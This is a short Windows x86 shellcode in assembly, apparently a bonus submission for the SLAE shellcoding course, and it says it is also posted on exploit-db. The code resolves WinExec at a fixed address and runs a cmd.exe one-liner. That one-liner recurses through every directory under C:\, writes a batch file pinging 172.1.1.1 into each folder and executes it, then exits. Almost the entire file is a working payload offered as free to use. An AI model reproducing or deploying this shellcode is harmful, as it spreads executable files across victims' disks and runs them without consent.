; Student ID: SLAE - 871
; 2nd bonus SLAE Assigment - Posting additional new shellcodes beyond the assignments
; additionally -- code can be also found at https://www.exploit-db.com/exploits/41467/
; code free to use

[BITS 32]

global _start

section .text

_start:
    jmp short command

function:
    pop     ecx ; here we have our code
    xor     eax,eax
    mov     [ecx+100],al ; trick to set 0 (xor eax,eax) at the end of the code
    push    eax
    push    ecx
    mov     eax,0x77e6fd35 ; WinExec
    call    eax
    xor     eax,eax
    push    eax
    mov     eax,0x77e798fd ; ExitProcess
    call    eax

command:
    call function
    db 'cmd.exe /C "(cd c:\ &FOR /D /r %A IN (*) DO echo ping 172.1.1.1>"%A\z.bat"&(call "%A\z.bat"&&exit))"X'

